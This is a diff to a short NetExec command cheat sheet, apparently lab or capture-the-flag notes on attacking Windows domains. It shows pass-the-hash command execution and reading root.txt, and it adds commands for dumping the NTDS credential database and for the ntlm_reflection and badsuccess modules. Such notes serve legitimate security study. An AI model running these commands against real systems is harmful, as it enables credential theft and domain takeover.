@@ -74,3 +74,18 @@ nxc smb <ip> -u Administrator -H '<hash>' -x 'powershell -c "Get-ChildItem -Path
 ```
 nxc smb <ip> -u Administrator -H '<hash>' -x 'type C:\Users\Administrator\Desktop\root.txt'
 ```
+
+## Dumping ntds
+```
+nxc smb <ip> -u <user> -p '<passwd>' --ntds 
+```
+
+## NTLM Reflection
+```
+nxc smb <ip> -u <user> -p '<passwd>' -M ntlm_reflection
+````
+
+## BadSuccessor
+```
+nxc smb <ip> -u <user> -p '<passwd>' -M badsuccess
+```
